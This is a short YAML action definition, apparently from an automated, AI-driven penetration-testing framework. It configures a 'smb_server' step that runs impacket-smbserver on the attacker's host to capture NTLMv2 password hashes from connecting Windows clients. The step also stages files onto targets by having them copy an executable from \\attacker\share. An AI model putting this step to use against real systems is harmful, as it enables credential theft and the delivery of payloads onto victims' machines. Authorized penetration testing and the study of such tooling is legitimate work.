name: smb_server
category: creds
description: Start local SMB server for file transfer and hash capture
preconditions:
  - has_target
parameters:
  share_name: "share"
  share_path: from_engagement.tools_dir
command_template: "impacket-smbserver {share_name} {share_path} -smb2support"
parser: null
expected_effects:
  - smb_server_started
  - ntlm_hash_captured
falsifier:
  pattern: "Address already in use"
  timeout: 10
model_tier: haiku
mechanism: "Hosts SMB share on attacker. Target accesses via \\\\attacker_ip\\share. Captures NTLMv2 hashes from connecting clients. Also used for file transfer: copy \\\\attacker\\share\\file.exe on target. -smb2support required for modern Windows."
